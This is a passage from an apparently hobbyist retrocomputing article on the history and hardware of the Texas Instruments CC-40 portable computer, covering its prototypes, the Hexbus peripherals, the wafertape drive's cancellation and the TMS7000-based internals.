99/4A and 99/8.\\nFor expansion options, TI created a new and simpler peripheral interface called Hexbus (also variously seen as Hex-Bus, HEXBUS and HexBus in period literature and user notes, though here I'll render it Hexbus for the remainder of the article). TI positioned Hexbus as a universal means to service all but the highest-bandwidth devices, from modems and serial communications to printers and mass storage. As such, they replaced Lonestar's original 9-pin I/O port with Hexbus and additionally fitted it to the 99/2 and the 99/8. The protocol is straightforward to understand and implement, and I'll talk a bit about the technical aspects a little later since the devices we'll use all connect that way. TI planned to extend Hexbus support to the 99/4A and RM 3000 (in whatever form it ended up taking) so that as many of their comsumer computers as possible could use the same peripherals.\\nMeanwhile, as Tramiel began driving price cuts faster and deeper and TI was repeatedly forced to match them (as the old Klingon proverb says, revenge is a dish best served cold), management began considering the ALC/Lonestar as a potential anchor in the portables market where competition was not nearly so fierce. The ALC prototype (now the ALC-A, for Product A) was extended into a family of machines: a low-end ALC-LC (\"Low Cost\") with a 16-character LCD, limited BASIC, Hexbus but no cartridge port, and 1K of RAM; a high-end ALC-C to succeed the RM 3000 with a 40x6 character LCD, larger keyboard, cartridge port, Hexbus, cassette port and 8K of RAM (a terminal variant ALC-T added a 300bps modem); and then the ALC-A itself expanded into the ALC-A2, with the same 31-character LCD and original Chiclet keyboard, plus 2K of RAM, cartridge port and Hexbus. The cartridge port could accommodate programming languages like BASIC, Fortran and Pascal as well as application software, and Turner insisted it also allow RAM expansion.\\nTI paused the ALC-LC and ALC-C to get the ALC-A2 to market first, reasoning the design could easily be reworked for the others if it was successful. Renaming it as the Compact Computer 40, BASIC was made internal and the original drop-in cartridge port design (shown here on a late prototype) was reworked to a more typical card edge. Additionally, as 2K RAM was increasingly becoming inadequate even for portable systems, TI pumped the base RAM up to 6K \u2014 we'll talk about how TI arrived at that number presently. Now that everything was CMOS internally, it could run sufficiently well on just four AA batteries, which was a significant improvement in convenience, runtime and weight; an optional AC adapter could be connected for desktop use.\\nThe 99/2 and the revised 6K CC-40 made their debut at Winter CES 1983. The \"40\" came from TI's specious then-custom of counting ROM and RAM together as total \"memory,\" so according to their vaguely disingenuous marketdroids at the show the CC-40 had 40K of \"memory\" from its 6K of RAM and 34K of ROM (an unusual but truthful number that again I will explain when we get to the internals). This then carried over to the magazine copy in\\nCreative Computing\\nApril 1983, above, where an overly credulous David Ahl (et al) completely swallowed the TI baloney and said it was \"expandable to 128K thanks to the 16-bit processor.\"\\nIn reality both parts of that statement were false: it still ran an 8-bit TMS7000-series CPU, though at the time TI was careful not to say exactly what the CPU\\nwas\\n, and TI's memory claim was\\nmore\\nridiculous than Ahl reported as they actually alleged a ceiling of\\n168K\\nof \"memory\" \u2014 because it accepted cartridges of up to 128K of\\nROM\\n(i.e., 6 + 34 + 128). A 16K\\nRAM\\nexpansion was also planned and TI estimated a runtime of 200 hours on four alkaline AA batteries.\\nTI was justifiably very proud of Hexbus and demonstrated at least three peripherals at the show: an RS-232 serial interface for $100 [around $325 in 2025 dollars], a four-colour printer-plotter which many of you have already guessed the mechanism of and selling for $200 [$650], and a licensed version of the Exatron Stringy Floppy that TI reworked into what they called \"wafertape.\" Its sole mass storage option, the wafertape drive was priced at $139 [$460] plus media cost, which wasn't disclosed. A modem, full-size printer, wand input device and a video interface were announced for later in the year.\\nDespite being arguably more powerful, the 99/2 was clearly positioned as the junior product \u2014 TI priced it at just $100 [$325] while the CC-40 retailed for $249.95 [$810]. Software support likewise reflected the CC-40's higher priority. TI announced eight cartridges at the show, but only two of them were for the 99/2 at $19.95 [$65] each, and about twenty more promised titles were to be released on cassette tape at $9.95 [$32] a pop. On the other hand, the CC-40 got at least six cartridges (seven listed here) and at least thirteen additional software packages on wafertape, with a promised\\nseventy-five\\nmore; the most expensive of these retailed for almost $150 [$485]. TI informed attendees both computers would be available by summer.\\nUnfortunately, what should have been a triumphant return for TI at Summer CES 1983 turned into disaster. Commodore, fresh off the introduction of the Commodore 64 in 1982 at $595, had slashed the VIC-20 to a new low of $125 in January 1983 and once again forced TI to follow suit. By the time the June convention rolled around, Commodore had managed to gobble up over 50 percent of the home computer market and largely at TI's expense: the Commodore 64 was flying off shelves at under $300 \u2014 half its introductory price, even lower at discounters \u2014 and the VIC-20 continued selling briskly for $100 or less. In contrast to the 99/4A, Tramiel's high degree of vertical integration and low production costs ensured Commodore could still turn a profit. Nevertheless, TI doggedly matched the VIC-20's new price (with a rebate) and started taking a significant loss on every unit, which also put them in the distinctly unpalatable position of introducing the notionally low-end 99/2 at or above what the 99/4A was now selling for. The 99/2 was quietly cancelled the day before the show and TI later liquidated the small amount of stock that had already been manufactured.\\nIn fairness, TI was not the only one in trouble and both Atari and Mattel took massive losses as well. 1983 was also the year of the crap home computer with many other underwhelming systems being introduced at or near that magic $100 price point \u2014 and I know if I mention any by name,\\nsomeone\\nout there will howl because there will always be at least one person who loved theirs. Unlike TI's hardware, however, such systems were made cheap to sell cheap: while most customers correctly perceived them as technologically inferior, they at least covered their cost per unit, even though most of these fly-by-night also-rans flamed out within months.\\nSeeing all this upon arrival in Chicago, TI management abruptly decided not to exhibit the 99/8 either\\nand hastily put the display model behind a locked door for the show's duration. (Ironically, the\\nTomy Tutor\\n\u2014 nothing less than a modified clone of the 99/8 \u2014 made its American debut at the very same convention.) Although a public relations debacle of its own (some mischievous press coverage even reportedly printed pictures of the door), TI's most enduring announcement from that Summer CES was a threat to completely lock out third-party software for the 99/4A, a deeply unpopular and thinly veiled attempt to maximize its failing razor-and-blades model, and one they mostly made good on by enforcing their patents on GROM chips. The company's stock cratered after announcing a $119 million loss in July \u2014 both due to production costs and a critical overestimation of demand \u2014 and Bill Turner was forced out of the company. Incredibly, Turner's replacement Peter Field decided to double down on the strategy by slashing the price of peripherals as well as the computer.\\nOn the other hand, the CC-40 largely sailed above this fray because it was positioned as a\\nbusiness\\nproduct. Although ostensibly developed and sold by the same consumer products division \u2014 unlike the TI Professional PC from the data systems group which had also come out around this time \u2014 marketing took great pains to distance it from the ailing home computer line and emphasize its utility for serious business rather than general purpose entertainment. Bill Cosby, celebrity endorser of both TI since 1982 and Jell-O, which closely resembled the spines of certain TI executives, was there to remind you there was always room for a CC-40 (and prison time).\\nIn the official marketing pamphlets TI provided at Winter CES 1983, you can see the difference in tone between the CC-40's and the contemporary 99/4A's: Cosby is more casually dressed for the 99/4A and it appears prominently billed as a home computer in two places just on the cover alone, yet for the CC-40 he presents the computer and a wafertape while wearing business attire, using executive buzzwords like \"solutions\" and making no mention of home applications at all. (This particular pamphlet is the source of some of the scans I showed you previously.) Based on early hands-on reviews around August 1983\\nand estimating about a two to three month publishing delay, it appears the CC-40 made it to retailers at the promised price point between May and June of that year.\\nThe released CC-40 is very similar to the ALC concept; the CC-40 retains Lonestar's general form factor and its 31-character non-dot-addressible LCD with various mode indicators. These indicators not only include things like the state of the SHIFT key and the current trigonometric unit of angle, but also unique user-addressible arrow-like markers along the bottom of the LCD panel which can be programmatically toggled to signal the user. Limited custom graphics were possible by redefining one of six screen characters dedicated to the purpose.\\nThe keyboard, however, was one thing that did change. While the ALC and the CC-40 use the same \"Chiclet\" keyboard in the same overall layout, including a small numeric keypad, some of the keys were moved around and certain others removed. The undated ALC image I have above likely came from the same source as\\nthese documents from a former TI engineer\\n, one of which shows the MODE key crossed out, the LBL key replaced with CTRL and the equals key at the bottom left of the numeric keypad replaced with a generic \"FN\" function key. It looks like the ALC was also proposed to support some sort of Japanese language entry, most likely katakana (the display was not sufficient for most hiragana, let alone full-blown kanji), but this feature was also subsequently eliminated. On the image here I can't distinguish what the shifted characters were meant to be, but\\nthis photograph\\nappears to be of the same or similar ALC mockup, showing some typographical characters also moved around as well as a line of deep blue secondary functions possibly for debugging purposes.\\nIf you have big hands, then you probably have big thumbs, and you know what they say about guys with big thumbs: they can type better on handheld computers. (What? This is a family blog.) In my clodhopper not-quite-varsity basketball mitts the CC-40 is almost a handheld but it wasn't for most people, and even more so than its single-line LCD the roughly 80% keycaps \u2014 although considered better than the 99/2's mushy Chiclets \u2014 provoked polarized opinions. Joe Devlin in\\nCreative Computing\\nsaid the keyboard was \"not all it might be,\" but found it \"well-built\" with \"no hint of keybounce that is a frequent plague,\" while\\nMicrocomputing\\nasserted it was \"basically a calculator keypad with letters on it\" and\\nByte\\n's David Ramsey bluntly called it \"vile.\" On the other hand, it was certainly no worse than, say, an HP-75. A small recessed divot next to the space bar acts as a soft reset button; the machine also comes with a translucent keyboard overlay with quick combinations to type BASIC keywords, though this falls off easily and I don't much use it myself.\\nThe underside of the unit contains the battery door (four AA batteries) and a sturdy flip-up stand for using it on a desk. There are supposed to be four rubber feet but the glue kind of sucks and two of them came off at some point. The CC-40's official model number, shown here, is the \"CC 40.\" This unit is serial #A001818 with date code ATA3583, indicating it was assembled at TI's plant in Abilene, TX in the 35th week of 1983 (i.e., end of August).\\nThe CC-40 has just three external ports. On the left side of the computer (right in this image) are the AC power jack and the Hexbus connector, and on the right is the single cartridge port. The power jack, officially TI's model AC 9201 wallwart, is a standard barrel connector providing 6V DC but atypically negative tip. However, kudos do have to be given to TI for its power implementation: people have reported accidentally connecting a positive tip AC adapter will not let out the magic smoke (it just won't work, though always try to avoid it), and you can use the AC adapter to bridge changing the batteries while it's running. The CC-40 will seamlessly switch to AC power when it's available and batteries when it isn't, including the situation where the barrel jack is plugged in but the wallwart is not. If all else fails, I have read various reports that the system will maintain memory contents for about a minute if you can swap the batteries quickly, which matches my personal experience. That said, I use lithium AAs in mine and I have yet to replace them.\\nUnlike the drop-in cartridges of the prototype, released cartridges have a more typical card edge protected by a sliding cap which guides the edge into the slot. The ROM software cartridges and the RAM expanders have the same form factor, but there is only one slot, so it is not possible to have a RAM expansion and a ROM cartridge plugged in together. (Although modern homebrew combo cartridges exist with both ROM and RAM, they don't support accessing both at the same time.)\\nAs you saw in the extract from the marketing pamphlet, TI called their ROM cartridges \"Solid State Software.\" However, not all the promised cartridges were ever released. TI only officially sold the Statistics, Finance, Pascal, Memo Processor, Games I, Electronics (\"Advanced Electrical Engineering\") and Mathematics cartridges, though the Editor/Assembler cartridge was subsequently found and dumped, and nowadays appears on most multicarts. On the other hand, despite being officially planned, Business Graphics and Games II have yet to be discovered. These cartridges appear to the computer as programs which can be run by name; some cartridges like Games I have multiple programs (Hunt the Wumpus, Hammurabi, Stocks and Bonds, Spacecraft Landing Simulation and Backgammon; Games II would have had Codebreaker, Interchange, Nim, Sea Battle, Number Gallery and Word Scramble). Some cartridges can also add functionality to BASIC programs. We'll look at one of these cartridges in particular a little later on.\\nTI produced two RAM cartridges for the CC-40, though because of the CC-40's unusual BASIC memory map, not all of their RAM was useable under all circumstances. The most common, and arguably the most useful for a particular reason I'll mention shortly, was the 8K Constant Memory cartridge. This cartridge contained battery-backed RAM which could either be added to the system as expansion memory for BASIC (but resets the system when taken out), or be used as a removable storage medium with a small machine language program. In this second mode the entire memory of the standard 6K system could be copied to the cartridge and back, and since it carried a small lithium battery, its contents \u2014 including the machine language subroutine necessary to load from it \u2014 would persist when unplugged. TI estimated this battery would last about three to five years using a mechanism that would connect the battery only on first use. Naturally, unless you find an unused NOS unit, current examples are dead as doornails but despite not being user-serviceable the batteries can be replaced with some effort.\\nThe second option was the 16K RAM cartridge that TI had originally promised. This unit lacked a battery and was completely volatile. Although technically capable of serving as a storage medium, it could only do so while the cartridge remained connected and the computer's batteries were good, so it was most useful simply as expanded memory. Unfortunately, while the original 2K iteration could take advantage of all 8K and 16K (to yield 10K and 18K respectively), BASIC's memory map in the released 6K CC-40 couldn't access 4K of either device \u2014 which is to say the 8K cartridge could only add 4K of memory to BASIC to yield 10K (though all 8K was addressable), and the 16K only 12K to yield 18K. Although TI did mention a 2K expander in documentation, no such cartridge was sold. Despite this deficiency, the CC-40's memory map can support up to 32K of external memory and modern homebrew RAM cartridges typically provide all 32K with battery backup a la the original 8K Constant Memory.\\nThat brings us to the eight-pin Hexbus port, though the manual calls it the \"peripheral port.\" Hexbus is a four-bit parallel interface over an extended bus capable of addressing up to 255 intelligent devices (device 0 is \"all devices\"), and the \"hex\" part likely reflects that it can send an entire hexadecimal digit at once with the remainder for ground, handshaking and future expansion. It is hot-pluggable and largely device-agnostic, and like the analogous Atari SIO system can be considered a spiritual ancestor of modern USB. Hexbus hosts are generally the centre of the bus (unless this role has been reassigned) and as such order downstream devices to act or report using command and data packets. It is possible to interrupt the host when a device requires service, though this requires the host to subsequently poll each enabled device to determined who interrupted it. (Foreshadowing.) Power is not distributed over Hexbus\\nsensu stricto\\nbut we'll get to a later variation that can.\\nTI intended Hexbus to service all kinds of peripherals and assigned fixed device number ranges to various classes. In practice this was not always strictly observed, nor were all assigned device classes actually used or all possible numerical ranges actually assigned. Among others, officially 1-2 were for cassette tape but 3-8 for tape mass storage, 10-19 for various sorts of printers (with subclasses beneath them) but 50-53 for Centronics-style parallel interfaces, 20-23 for RS-232 serial and 70-73 for modems, 30-33 and 40-43 for colour and black and white video interfaces, 100-109 for 5.25\" floppy disk drives, 110-117 for 3.5\", and 90-95 for barcode readers and scanners. 118-239 was explicitly dedicated to third-party use but most homebrew Hexbus devices, including the ones we'll use in this article, emulate the standard device IDs. Thirty-one different commands are defined; devices are only required to implement those which are relevant to their operation.\\nHexbus mandated the host be capable of no less than 3000 bytes/second for \"peripherals that require a minimum I/O transfer rate\" and the CC-40's user's guide rates the CC-40 as capable of up to 6000 bytes/second. Theoretically a nybble could be transmitted about every 16 microseconds, yielding a maximum throughput of around 31,250 bytes/second, though rarely was anything close to this top speed realized. Part of the problem was the protocol's overhead as well as the computers themselves, which for reasons of power consumption did not drive the bus particularly efficiently under ordinary circumstances. The other wart on Hexbus are the cables, which have poor strain relief and rely on a sometimes mushy friction fit in the ports, which themselves aren't well-reinforced either.\\nAs mentioned, the launch portfolio for Hexbus was a printer/plotter, RS-232 serial interface and the wafertape drive, and this three-pack was what appeared in the 1983 CC-40 pamphlet. For the 99/4A's 1983 pamphlet, however, notice that not only were Hexbus devices explicitly advertised with the new beige 4A (along with a beige PEB which I've never actually seen and was probably a mockup), but there were now\\nfour\\nof them.\\nThose four are shown here: the small printer/plotter (HX-1000 Printer/Plotter), the RS-232 box (HX-3000 RS-232), the wafertape (HX-2000, though this one is unmarked) and additionally a modem (HX-3100 Modem). They were intentionally stackable into an attractive cube configuration, though I note the printer/plotter has a different front bezel colour that doesn't match the other devices or what appeared in the pamphlets. Although the modem and wafertape can accept regular batteries, the printer/plotter is powered by a NiCad pack with all the attendant disadvantages and uses its own charger (AC 9203, nominally 9V center-tip but my multimeter reads about 12.5V), and the RS-232 box must be connected to wall power (using another AC 9201 adapter, same as the CC-40 itself).\\nAnyone who knows anything about plotters of this era will recognize the mechanism in the printer/plotter: it's another Alps DPG-1302,\\nthe same as\\nthe Tandy CGP-115, Commodore 1520, Atari 1020, Oric MCP-40 and\\nthe Convergent Microprinter WP-100\\n, among many others. However, that also means that refurbishing it is fortunately quite practical once you replace that hideous internal battery pack.\\nLater on a full-size 80-column dot matrix printer (HX-1010 Printer 80) became available, though unlike the plotter this one can take regular D batteries (four). This printer is based on a Brother printer mechanism also found in their EP-20 electronic typewriter and uses the same ribbons, or if you have no ribbons, you can use it as a thermal printer with fax paper such as that for\\nthe Silent 700 series\\n. I don't have the AC 9401 supply the Printer 80 uses, but based on the EP-20 (which also could run on four D batteries) it is likely also 6V tip negative at 1.0A, unlike the 300mA AC 9201.\\nMore so than the others, however, the wafertape drive was intended to be the star of the show. It is in fact a portable version of the Exatron Stringy Floppy (from Exatron in Sunnyvale, later Entrepo, Inc.), a high-speed (for the era) continuous-loop tape system first introduced in 1978 for which Texas Instruments had negotiated an exclusive license in 1982. Like other forms of tape storage the Stringy Floppy is inherently sequential, and has no true provision for random access \u2014 files must be scanned through in order until the desired one is encountered. But, because it's looped and streams fast, it can nevertheless achieve speeds comparable to a conventional floppy disk system. The wafertapes (\"microwafers\") fit easily in one's hand, or at least they do in\\nmy\\nhand.\\nThe length of the tape naturally determines its capacity, although longer tapes are also unavoidably slower to search. In my collection I have 5 foot, 10 foot, 25 foot and 50 foot wafers, apparently the only sizes TI offered, which in a somewhat non-linear fashion respectively correspond to maximum capacities of 4K, 12K, 32K and 64K. The wafertape drive is typically device 1, the same range as cassette tapes, though a selector in the back can pick a device ID anywhere from 1 to 8 if you were crazy enough to have a stack of them.\\nIn retrospect TI's choice of the Stringy Floppy was peculiar because the device already had a somewhat chequered reputation on other platforms. Although reasonably fast, its storage capacities were unimpressive compared to floppies and the media wasn't cheap. Worse still, the tape media was well-known for being prone to tangling and even sometimes outright fracturing, a problem that only got worse as tapes got older and more fragile, and tended to happen more with expensive higher-capacity cartridges because the tape in them was thinner. Repairing a mangled or broken tape could be an exceptionally fiddly business which I've experienced enough firsthand to the point where I rarely use the wafertape drive anymore except for demonstrations.\\nYet all that was not sufficient to deter TI, who wanted to avoid the association of ordinary cassette storage with home computers, and believed the wafertape drive would be seen as handy, speedy and state of the art. However, two more flaws subsequently became apparent. The first was that tape handling became even more unreliable on battery power, especially as the batteries got low, and virtually necessitated the device be connected to the wall. But the second, discovered in October 1983, was a rare but critical fault in its internal microcontroller where under specific circumstances it could unexpectedly fail to wake on an interrupt and thus go out of synchronization.\\nBy the time this fault was discovered, CC-40 owners were already howling because of the backlog on peripherals \u2014\\nany\\nperipherals. These didn't start hitting retail channels until the fall and sometimes even later: my modem has an ATA3483 date code while my RS-232 box has an LTA4983 date code, well into December, and my NOS printer/plotter has a date code of 014 indicating January of 1984. The delays were significant enough that as early as July TI had already announced expected declines in CC-40 sales, at the same time Bill Turner got cashiered, and ended up taking writeoffs. Although the wafertape drives were being manufactured on the same timetable (mine has an ATA3383 date), at that point the CC-40 was clearly in decline and TI management didn't want an expensive recall or lawsuit incited by the drives' flaws on a product entering twilight. The wafertape drive was cancelled before it was ever sold and stickers saying so went out on every CC-40's box thereafter. (Note the box copy: the copyright says 1982, and the modem wasn't ready by then, so it doesn't appear.)\\nBut since there were stacks of other boxes and documentation already printed referencing the wafertape, TI wasn't content to mark just the CC-40's box alone with its discontinuation; they also jammed slips in manuals and slapped stickers on the boxes of the other peripherals so that they didn't need to be reprinted (and no one could claim TI didn't warn them). This ended up making the 8K Constant Memory cartridge practically essential because without it you had no chance of saving anything.\\nOne other mass storage device was created by TI for Hexbus, a 5.25\" floppy drive, but while it may have been able to work with the CC-40 this device was actually intended for the home computer line and went unreleased. There was also a prototype\\nHexbus colour video interface\\n, in practice more like a serial terminal that accepts commands from the CC-40 and draws a screen with its own internal 9918 (actually a 9118, which is functionally equivalent). The also-unreleased Editor/Assembler cartridge can control this interface for full-screen editing. Without a viable mass storage option, however, there didn't seem much point in releasing either one.\\nMeanwhile, TI had always intended to produce the CC-40 in different configurations, sort of a further expansion of the ALC family. In memory configurations alone TI envisioned five buckets at 2K, 4K, 6K, 10K and 18K (and these even appear in the user's guide), but eventually only publicly produced the 6K and top-spec 18K models. The 18K's arrival was tardy and it received little fanfare and even less mention in the press.\\nIt surely didn't help that the only indication it had\\nthree times\\nthe base model's memory were two grotty fluorescent green \"18K\" stickers, like you'd find on a cheapo semi-gold earring stud, and which have peeled off most units since. This is my NOS 18K showing everything that came in the box with every CC-40, including a keyboard overlay (installed), READ THIS FIRST! card, quick reference card, user's guide (with wafertape warning), and a set of AA batteries. Nowhere else is its expanded capacity mentioned.\\nYou couldn't even tell from the bottom of the unit; the model numbers (both \"CC 40\") are exactly the same, and the serial number and date code on this 18K (lower left) are #A000685 and ATA3483, manufactured nearly simultaneously with my usual 6K. On the one hand, the 18K variant was definitely worth getting if you needed the memory: not only did it have more at baseline, but unlike the 6K unit its BASIC could also use the entirety of the 8K and 16K cartridges for up to 34K RAM total. On the other hand, it was obviously impossible to store all 18K in an 8K Constant Memory cartridge, it was never available in large numbers, and most people at the time didn't even seem to know it existed. Despite being brought in at the same $249.95 price point or less to flog sales, it made little impact.\\nThe reason TI figured they could churn out a whole bunch of configurations is because internally the CC-40 is very simple, just a handful of chips and through-hole discrete components on two PCBs. Here I'm showing the main CPU board so I don't have to play 69-key pickup with the keyboard/LCD board beneath it. That board is even simpler with just a bog-standard Hitachi HD44780 LCD driver/controller supplemented by an HD44100 LCD driver to handle the additional display segments. The character segments are divided roughly into quarters with the HD44780 handling the common lines and first and third quarters and the HD44100 handling the second and fourth, plus the display indicators.\\nOrienting the battery compartment to the bottom, the topmost three chips here are the RAM. In the base model these are three 2K 6116 static RAM chips, yielding an unusual total of 6K. However, notice that the two at the top of this picture sit on pads bigger than they are and the one below them does not, plus wire jumpers just above the 5.000MHz crystal oscillator. We'll come back to those items in a moment. The power and reset circuitry is on the left side set off by a weird little plastic sleeve containing a bridging resistor.\\nZooming in a little, we see the two primary chips, the CPU (the DIP on the lower right) and the control ASIC (the QFP). The ASIC was fabbed by American Microsystems (AMI, later AMI Semiconductor, and subsequently acquired by onsemi in 2008) and acts as a \"Grand Central\" address decoder for the LCD, piezo beeper, internal ROM, cartridge ROM and RAM. It also handles the Hexbus lines and uses the crystal for its own clock source which it additionally passes through to the CPU.\\nThe CPU is a TMS70C20 and indeed a CMOS version of the 8-bit TMS7000 microcontroller we discussed earlier, with the \"2\" indicating a built-in 2K of mask ROM (the version of the mask ROM is C11002, \"C\" meaning standard microcode), and a date code of 10th week 1983. The full model designation of \"TMX70C20N2L\" is interesting for several reasons: \"TMX\" indicates the earliest stage of production device where the die may not be fully developed (versus the TMP \"prototype\" where it is, and the TMS \"sale\" version designation is fully qualified for production), and the \"N2\" is a 70mil (0.07\" or 1.78mm)-spaced DIP as opposed to the more typical \"N\" which is a 100mil (0.1\" or 2.54mm)-spaced DIP, both rated for operation in typical temperature ranges (\"L\"). It divides down the 5MHz signal from the ASIC to yield its nominal clock speed of 2.5MHz, and has a 16-bit address bus for a maximum 64K addressing space.\\nTI fabbed the TMS7000 family using what it called \"Strip Chip Architecture Topology.\" Setting out explicitly to make an easily reconfigurable design, TI stepped away from more parsimonious layouts like the 6502's and platted out its logic in quadrilateral functional blocks it termed \"strips.\" Unlike those earlier designs, and unlike later multi-chip modules using multiple dies, these blocks could be connected with a minimum of additional logic and then promptly unified on a single die for fabrication. One strip included the timer, I/O control, interrupts, on-chip registers and ALU; another held the microcode and PLA for instruction decoding; another held the onboard ROM; another the onboard RAM, and so forth.\\nYou can see one result in the die picture on the front of TI's product circular. The large strips for the microcode and onboard ROM are easily distinguished (the \"darker\" strips along the left and centre) as is the on-board RAM (the patterned strip along the right). The ALU/registers/etc. strip is between the two ROMs, and the remainder is smaller functional blocks and glue circuitry. Like the TMS1000 it was intended to succeed, TMS7000s shipped from the factory with optional mask ROM (2K in the TMS702x/C2x, 4K in the TMS704x/C4x and 12K in the TMS70120) and optional custom instruction microcode (\"L\" series mask ROM designators). To make a different chip, say, with more ROM or a different instruction decoder, a different strip was loaded to replace it \u2014 potentially even a different\\nsized\\nstrip \u2014 while the others could remain the same. (TI's brochure even brags that the 7040 was created from the 7020 without redesigning the chip: the \"design was separated at the memory border and the additional 2K of memory simply inserted alongside the original 2K of memory by the design computer.\") The baseline TMS7000 had no ROM, but the development SE70P16x chips carried a socket on top for piggybacking an EPROM (or you could use the TMS7742 which had an EPROM of its own inside), configurations also offered by other microcontroller manufacturers of the period. TI reserved the first six bytes of the ROM for internal purposes. It is possible to\\ndump and save the contents of the internal ROM\\n.\\nLike the Intel 8051 and Motorola 6801, with which it was intended to directly compete, the TMS7000 family included onboard RAM and I/O standard. The 70x0 and 70Cx0 chips accepted up to a 5MHz clock source (divided by two or four) and provided 128 bytes of onboard RAM, a single 13-bit timer and 16, 8 and 8 (respectively) bidirectional, input and output I/O lines. In the CC-40, those I/O lines are mostly dedicated to the keyboard and memory addressing. The higher grade 70x2 and 70Cx2 chips accepted up to an 8MHz clock source and provided 256 bytes of onboard RAM, two 13-bit and one 10-bit timers, an on-chip serial port and 22, 2 and 8 bidrectional, input and output I/O lines. On the other hand, the TMS7000 was more like the 6801 in that it was a Von Neumann architecture and incorporated the on-chip features as memory-mapped I/O. 10MHz crystals were later supported, though these were still divided down for the internal clock.\\nThe TMS7000 turned out to be a very bright spot for TI; it was substantially faster than the 8051 at most operations and quicker than even an equivalently clocked 6801 or Zilog Z8. I'll have more to say about the CPU when we get to actually writing assembly code for it.\\nHere is the ROM (apart from what's in the 70C20) and the other two RAM chips. This external 32K 61256 ROM stores BASIC and higher level portions of the operating system, while the lowest level portions are within the CPU's mask ROM strip. Since 32K would consume half the CPU's addressing space, it is instead banked in using 8K segments (more on that later). Either way that gets you your 34K total of ROM, and in the mildly mendacious world of TI six plus thirty-four equals forty, so that's the CC-40.\\nThe lower of the two RAM chips has no extra pads. This is in fact the original 2K configuration and what would have been present on any CC-40 variant. This lowest 2K is reserved by the system and not available for BASIC programs in any CC-40 configuration, but can be used by machine language programs and is legitimately addressable RAM.\\nFor the other configurations we crack open the 18K version. The jumper wires I pointed out have moved, and the two upper 2K 6116 RAM chips have been replaced with 8K 6264s (2 + 8 + 8 = 18) which use the extra pads for their additional addressing lines. With this basic template in mind, the other configurations would probably have been no additional chips (2K), two 1K chips (4K), and two 4K chips (10K). It wasn't long before existing CC-40 owners discovered they could do such an upgrade themselves, to TI's great chagrin, even though this would clearly void the warranty.\\nOne other notable landmark on the board is this bundle of resistors sprouting from a blob of solder connected to the ground plane. These are pull-downs for the Hexbus lines.\\nThe peripherals necessarily also have their own CPUs, mostly TMS70C20s as well, such as the RS-232 box's board shown here. This is also a 70C20N2L with the narrower pin spacing and has a ROM code of C14018 with a date code of 10th week 1983. It runs slightly slower at 2MHz from a 4MHz crystal, but instead of bitbanging the serial port it has a real 6551 ACIA made by Synertek with a date code of 19th week 1983. The ACIA has its own 1.8432MHz crystal. A set of headers above the CPU allows the installation of an optional parallel port.\\nThe other notable chip on this board is directly above the SY6551, a 22-pin TI 1052911 manufactured 18th week 1983. This is the Intelligent Peripheral Bus Controller (IBC for short), managing the Hexbus lines for the CPU instead of requiring additional bitbanging, and generating an interrupt when data is available. In later devices it is superseded by the 28-pin TP0370. Everything else is off-the-shelf. We'll have more to say about the RS-232 box when we get to discussing Hexbus communication options in detail.\\nThe lack of a viable mass-storage option severely damaged TI's attempts to portray the CC-40 as a useful portable computer. Consequently (and ironically), many owners tended to treat it as an overgrown programmable calculator instead, a task at which it nevertheless excelled in part due to its higher-precision base 100 BCD floating point and polynomial transcendentals, as well as the software on the limited selection of Solid State Cartridges which (although expensive and few in number) were generally high quality. On top of that, it was also substantially faster than TI's other programmable calculators and was of course capable of more sophisticated algorithms. Some users were able to source remaindered wafertape drives through unofficial channels but a third-party Hexbus storage device, the Mechatronics QD-01 Quickdisk using an unusual 2.8\" medium, did not become widely available until 1986. Meanwhile, the consumer products division, now under half a billion dollars in cumulative debt from their ruinous price war with Commodore Business Machines, threw in the towel and announced on October 28, 1983 that they were abandoning the home computer market. The 99/8, all but cut from life support already, was officially canned earlier in October\\nafter about 150 had been made;\\nproduction also immediately ceased for the 99/4A, after which it was heavily discounted\\nand the remaining stock liquidated in March 1984.\\nOnce again, however, the CC-40 temporarily avoided this fate because TI continued to sell and market it as a business product, just like the TI Professional PC, which TI claimed was still doing well. By early 1984 the 6K CC-40 had dropped below $200 at retail, although the 18K version was all but nonexistent in sales channels.\\nTI's later CC-40 marketing materials, such as the 1984 flyer here that oddly still used a photograph of the drop-in-cartridge prototype, further emphasized its suitability for custom business environments while adding they could convert your software into cartridges for \"instant plug-in customization.\" Some companies actually sold\\nrebadged CC-40s\\nwith such custom cartridges installed, though none of these variants were ever very numerous, and all were OEMed by TI. The modem finally appeared on this flyer as an option but naturally not the wafertape, which was by then a distant memory.\\nThe TI-74 BASICALC\\nIn the meantime TI nevertheless worked on two direct follow-ons to the CC-40. One was the final embodiment of the RM 3000/ALC-C concept, incorporating a larger 40-character by 6-line LCD with a proper full size-and-travel keyboard intended to compete with the TRS-80 Model 100. Since the CC-40 now shipped in an 18K configuration, the so-called Compact Computer 70 (\"CC-70\") would likely have shipped with even more memory than the 8K of the original ALC-C. We'll never know, unfortunately, because the only known example is\\nan empty mockup shell\\n, reportedly because the first batch of gate array chips for the prototype were defective.\\nThe other was an expanded CC-40 based generally on the same hardware called the\\nCC-40 Plus\\n(\"CC-40+\"), internally model \"CC40001\". Externally similar, and still nominally a 6K unit (though an 18K version was planned), its biggest upgrade was a new built-in 9-pin port to finally support loading and saving to cassette tape. Although implemented as an internal peripheral with its own notional Hexbus device number (device 1, replacing the wafertape drive, though properly in the range designated for cassette devices), there is specific support and prompts in the CC-40+ ROM for driving it and the cable cannot be retrofitted to an original CC-40. To accommodate these and other possible changes the on-chip system ROM was expanded to 4K and thus was introduced the TMS70C40 to the CC-40 family.\\nThe CC-40 Plus got as far as prototyping and a small number of test machines were produced before it, what then existed of the CC-70, and the CC-40 itself were all quietly cancelled in November 1984.\\nNo explanation could be publicly ascertained \u2014 until late in 1985, when a new device emerged from a different branch of the consumer products division.\\nAmidst the turmoil on the computer side of the business, TI's chip business was still doing well, and so were its calculators, still a solid product line since the 1970s. Why continue to fight in the business portables segment, reasoned management, when we can rework the already existing, already working CC-40 Plus into something appropriate for its size\\nthat we already know how to sell\\n? And that was the TI-74 BASICALC, a new higher-end programmable calculator that was nothing less than the CC-40 Plus in a sleeker, smaller package, hitting markets in the summer of 1986\\nat an MSRP of $135 [about $400 in 2025 dollars].\\nThe TI-74's marketing strongly emphasized its BASIC programmability, using this feature to set it apart from other calculators which were still largely programmed with some form of keystroke system. But all that came from the CC-40+, as did the 31-character screen (slightly smaller) and most of the same basic functions. Although the debugger in the CC-40 and CC-40 Plus was liquidated in the TI-74 to fit in its Algebraic Operating System (AOS) calculator mode, and the memory map was slightly altered and some BASIC functions removed, it was otherwise pretty much the same machine with 2K extra RAM in a more consumer friendly \u2014 